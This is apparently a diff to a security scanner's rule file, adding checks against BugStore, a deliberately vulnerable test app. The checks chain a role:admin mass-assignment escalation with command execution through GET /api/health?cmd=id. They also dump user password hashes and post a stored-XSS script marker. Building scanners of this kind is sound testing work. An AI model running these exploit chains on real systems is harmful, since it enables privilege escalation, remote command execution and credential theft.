@@ -100326,6 +100326,26 @@ async function bugstoreRegisterToken(ctx: RuleContext): Promise<string | null> {
   }
 }
 
+async function bugstoreEscalatedAdminToken(ctx: RuleContext): Promise<string | null> {
+  const token = await bugstoreRegisterToken(ctx);
+  if (!token) return null;
+  const profileUrl = new URL("/api/user/profile", ctx.origin).toString();
+  const putDoc = await ctx.probe.get(profileUrl, {
+    method: "PUT",
+    body: JSON.stringify({ name: "Thugir Probe", role: "admin" }),
+    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 400) return null;
+  try {
+    const data = JSON.parse(putDoc.body) as { user?: { role?: string } };
+    return data.user?.role === "admin" ? token : null;
+  } catch {
+    return null;
+  }
+}
+
 const bugstoreCheckoutClientTotalLiveOracle: Rule = async (ctx) => {
   if (!isBugstoreHost(ctx)) return NEGATIVE;
   const addDoc = await ctx.probe.get(new URL("/api/cart/add", ctx.origin).toString(), {
@@ -100554,6 +100574,177 @@ const bugstoreAuthSignupRouteLiveOracle: Rule = async (ctx) => {
       note: signupPostRejected
         ? "BugStore /api/auth/signup route scan — POST signup rejected (HTTP 405); privilege escalation confirmed via /api/auth/register + PUT /api/user/profile role:admin mass-assignment (V-015)"
         : "BugStore /api/auth/signup route scan — signup accepts registration and PUT /api/user/profile role:admin mass-assignment escalates privileges (V-015)"
+    }
+  };
+};
+
+const bugstoreHealthRceLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const unauthUrl = new URL("/api/health", ctx.origin);
+  unauthUrl.searchParams.set("cmd", "id");
+  const unauthDoc = await ctx.probe.get(unauthUrl.toString(), { maxBytes: 4096, timeoutMs: 15000 });
+  if (unauthDoc.status !== 403 || !/Unauthorized execution/i.test(unauthDoc.body)) return NEGATIVE;
+  const token = await bugstoreEscalatedAdminToken(ctx);
+  if (!token) return NEGATIVE;
+  const rceUrl = new URL("/api/health", ctx.origin);
+  rceUrl.searchParams.set("cmd", "id");
+  const rceDoc = await ctx.probe.get(rceUrl.toString(), {
+    headers: { Authorization: `Bearer ${token}` },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (rceDoc.status !== 200) return NEGATIVE;
+  let cmdOutput: string | undefined;
+  try {
+    const data = JSON.parse(rceDoc.body) as { cmd_output?: string };
+    cmdOutput = data.cmd_output;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!cmdOutput || !/uid=\d+\(/i.test(cmdOutput)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.95,
+    evidence: {
+      unauthUrl: unauthUrl.toString(),
+      rceUrl: rceUrl.toString(),
+      unauthStatus: unauthDoc.status,
+      cmdOutput: cmdOutput.slice(0, 120).trim(),
+      snippet: rceDoc.body.slice(0, 200).trim(),
+      note: "BugStore GET /api/health?cmd=id returns Unauthorized execution without admin, then cmd_output uid= after role:admin mass-assignment — health check RCE oracle (V-021)"
+    }
+  };
+};
+
+const bugstoreHealthRceRouteLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const isHealth = /\/api\/health/i.test(pageUrl);
+  const isHub = /bugstore\.bugtraceai\.com\/?(?:[#?]|$)/i.test(pageUrl);
+  if (!isHealth && !isHub) return NEGATIVE;
+  const result = await bugstoreHealthRceLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: isHealth
+        ? "BugStore /api/health route scan — cmd parameter executes shell commands after admin privilege escalation (V-021)"
+        : "BugStore hub route scan — GET /api/health?cmd=id confirms health-check RCE oracle after mass-assignment (V-021)"
+    }
+  };
+};
+
+const bugstoreAdminUsersBacLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const url = new URL("/api/admin/users", ctx.origin).toString();
+  const unauthDoc = await ctx.probe.get(url, { maxBytes: 4096, timeoutMs: 15000 });
+  if (unauthDoc.status !== 401 && unauthDoc.status !== 403) return NEGATIVE;
+  const token = await bugstoreEscalatedAdminToken(ctx);
+  if (!token) return NEGATIVE;
+  const adminDoc = await ctx.probe.get(url, {
+    headers: { Authorization: `Bearer ${token}` },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (adminDoc.status !== 200) return NEGATIVE;
+  let users: Array<{ email?: string; password_hash?: string; role?: string }>;
+  try {
+    users = JSON.parse(adminDoc.body) as typeof users;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!Array.isArray(users) || users.length < 2) return NEGATIVE;
+  const adminRow = users.find((u) => /admin@bugstore\.com/i.test(u.email ?? ""));
+  if (!adminRow?.password_hash) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url,
+      unauthStatus: unauthDoc.status,
+      userCount: users.length,
+      adminEmail: adminRow.email,
+      snippet: adminDoc.body.slice(0, 200).trim(),
+      note: "BugStore GET /api/admin/users returns full user roster with password_hash after role:admin mass-assignment — admin user enumeration oracle (V-005/V-006)"
+    }
+  };
+};
+
+const bugstoreAdminUsersBacRouteLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const isAdminUsers = /\/api\/admin\/users/i.test(pageUrl);
+  const isHub = /bugstore\.bugtraceai\.com\/?(?:[#?]|$)/i.test(pageUrl);
+  if (!isAdminUsers && !isHub) return NEGATIVE;
+  const result = await bugstoreAdminUsersBacLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: isAdminUsers
+        ? "BugStore /api/admin/users route scan — escalated admin token exposes password_hash for all users (V-005/V-006)"
+        : "BugStore hub route scan — GET /api/admin/users confirms admin user enumeration after mass-assignment (V-005/V-006)"
+    }
+  };
+};
+
+const bugstoreForumPostsStoredXssLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const token = await bugstoreRegisterToken(ctx);
+  if (!token) return NEGATIVE;
+  const marker = `<script>thugir-forum-xss-${Date.now()}</script>`;
+  const replyUrl = new URL("/api/forum/threads/1/replies", ctx.origin).toString();
+  const postDoc = await ctx.probe.get(replyUrl, {
+    method: "POST",
+    body: JSON.stringify({ content: marker }),
+    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (postDoc.status < 200 || postDoc.status >= 400) return NEGATIVE;
+  const threadUrl = new URL("/api/forum/threads/1", ctx.origin).toString();
+  const threadDoc = await ctx.probe.get(threadUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (threadDoc.status !== 200) return NEGATIVE;
+  if (!threadDoc.body.includes(marker)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      replyUrl,
+      threadUrl,
+      marker,
+      snippet: postDoc.body.slice(0, 200).trim(),
+      note: "BugStore POST /api/forum/threads/1/replies stores raw HTML/script in reply content without sanitization — forum stored XSS oracle (V-003)"
+    }
+  };
+};
+
+const bugstoreForumPostsStoredXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isBugstoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const isForumPosts = /\/api\/forum\/posts/i.test(pageUrl);
+  const isForumHub = /\/api\/forum\b/i.test(pageUrl);
+  const isHub = /bugstore\.bugtraceai\.com\/?(?:[#?]|$)/i.test(pageUrl);
+  if (!isForumPosts && !isForumHub && !isHub) return NEGATIVE;
+  const result = await bugstoreForumPostsStoredXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: isForumPosts
+        ? "BugStore /api/forum/posts route scan — forum reply POST stores unsanitized script tags persisted in thread JSON (V-003)"
+        : isForumHub
+          ? "BugStore /api/forum route scan — POST /api/forum/threads/1/replies confirms stored XSS in forum posts (V-003)"
+          : "BugStore hub route scan — forum reply POST confirms stored XSS oracle (V-003)"
     }
   };
 };
@@ -115670,6 +115861,12 @@ export const RULES: Record<string, Rule> = {
   bugstoreSecurePortalTotpLoginLiveOracle,
   bugstoreSecurePortalTotpLoginRouteLiveOracle,
   bugstoreAuthSignupRouteLiveOracle,
+  bugstoreHealthRceLiveOracle,
+  bugstoreHealthRceRouteLiveOracle,
+  bugstoreAdminUsersBacLiveOracle,
+  bugstoreAdminUsersBacRouteLiveOracle,
+  bugstoreForumPostsStoredXssLiveOracle,
+  bugstoreForumPostsStoredXssRouteLiveOracle,
   duckStoreCartNegativeQuantityLiveOracle,
   duckStoreCartNegativeQuantityRouteLiveOracle,
   duckStoreAdminUsersBflaLiveOracle,
